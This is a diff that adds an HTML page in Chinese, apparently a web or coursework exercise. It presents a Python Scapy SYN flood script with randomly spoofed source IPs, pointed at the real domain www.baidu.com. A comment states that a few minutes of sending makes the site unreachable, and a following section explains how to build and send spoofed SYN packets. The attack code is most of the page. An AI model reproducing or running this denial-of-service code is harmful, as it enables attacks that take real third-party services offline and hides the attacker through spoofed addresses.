@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>代码分析</title>
+    <link rel="stylesheet" type="text/css" href="a.css"> <!--用link链接到导入css文件-->
+
+<!--    <style type="text/css">-->
+<!--        a{-->
+<!--            font-size: 40px;-->
+<!--            color: #0c0c0c;-->
+<!--        }-->
+
+<!--    </style>  &lt;!&ndash;控制所有标签下的&ndash;&gt;-->
+</head>
+<body>
+<!--<h1 style="text-align: left;"><a> 代码分析</a></h1>-->
+<!--<h2 ><a> 下面是一个简单的python SYN flood 代码示例</a></h2>-->
+    <div class="container">
+        <div class="box1">
+            <h1 ><a> 下面是一个简单的python SYN flood 代码示例</a></h1>
+            <p style="text-align:left;" >
+
+                import random<br>
+                import socket<br>
+                import time<br>
+                from scapy.all import *<br>
+                #  定义syn洪流函数，tgt为目标ip，dPort为目标端口<br>
+                def synFlood(tgt,dPort):<br>
+                #  先任意伪造4个ip地址<br>
+                srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',<br>
+                '125.130.5.199']<br>
+                #  选择任意一个端口号<br>
+                for sPort in range(1024, 65535):<br>
+                index = random.randrange(4)<br>
+                #  类似上面那个代码构造IP/TCP包，然后send<br>
+                ipLayer = IP(src=srcList[index], dst=tgt)<br>
+                tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')<br>
+                packet = ipLayer/tcpLayer<br>
+                send(packet)<br>
+
+                domain = "www.baidu.com" #定义你想攻击的域名<br>
+                tgt = socket.gethostbyname(domain)  #利用socket的方法获取域名的ip地址，即dns解析<br>
+                print(tgt) # 打印<br>
+                dPort = 80 # 网络传输常用端口号<br>
+                synFlood(tgt,dPort) #调用syn洪流函数，然后发送syn包<br>
+                #发送完后就可以去看看这个服务器的响应速度了。一般是持续发送几分钟，这个网站就访问不了<br>
+            </p>
+        </div>
+        <div class="box2">
+
+            Scapy是一个强大的交互式数据包处理程序。可用来发送、嗅探、解析和伪造网络数据包。在网络攻击和渗透测试中应用非常广泛。<br>
+            现在我们用Scapy构造一个简单的数据包看一下：<br>
+            pkt = IP(dst="192.168.0.100")<br>
+            我们再来看一下如何构造SYN数据包：<br>
+            IP(src="202.121.0.12",dst="192.168.0.100")/TCP(dport=80,flags="S")<br>
+            我们构造了一个IP包和TCP包并将它们组合到一块，这样就有了一个完整的TCP数据包，否则是无法发送出去的。<br>
+            IP包中我们指定了源地址src和目的地址dst，其中src是我们伪造的地址，当然这也是DoS攻击中保护攻击者的一种方式。<br>
+            flags的值我们设定为S,说明我们要发送的是SYN数据包。非常简短的一段指令就够造了一个伪造了源IP地址的SYN数据包.<br>
+
+            构造了我们想要的数据包，现在我们把它发送出去：<br>
+            pkt = IP(src="202.121.0.12",dst="192.168.0.100")/TCP(dport=80,flags="S")<br>
+            send(pkt)<br>
+            至此我们编写SYN泛洪攻击的基本知识就已经全部介绍完了，用这些知识足够我们来完成本次试验了。<br>
+            代码实现<br>
+            现在我们要用Python以第三方库的形式使用Scapy,注意：使用前要先导Scapy的包：<br>
+            from scapy.all import<br>
+            之前我们已经构造过了SYN数据包，现在我们需要实现随机伪造源IP地址、以及以不同的源端口向目标主机发送SYN数据包:<br>
+            在代码中我定义了srcList用于存放伪造的IP地址，之后定义了一个循环，作用是每次发送数据包源端口都改变，<br>
+            可以看到在构造TCP数据包的时候我们增加了一个参数sport，循环中改变的端口号就是给了sport这个参数。我们还调用random.randrange()函数来随机从srcList中获取一个伪造的IP地址。<br>
+            至此我们本次实验就完成了，虽然代码非常少不过功能我们却实现的比较理想，这主要是因为Python的语法本身非常简洁，再加上Scapy封装的也非常好，才会让我们写出即简洁功能又强大的代码。<br>
+
+        </div>
+
+    </div>
+
+<!--<a style="font-size:40px;color: #0b74cb ">代码展示</a>-->
+</body>
+</html>
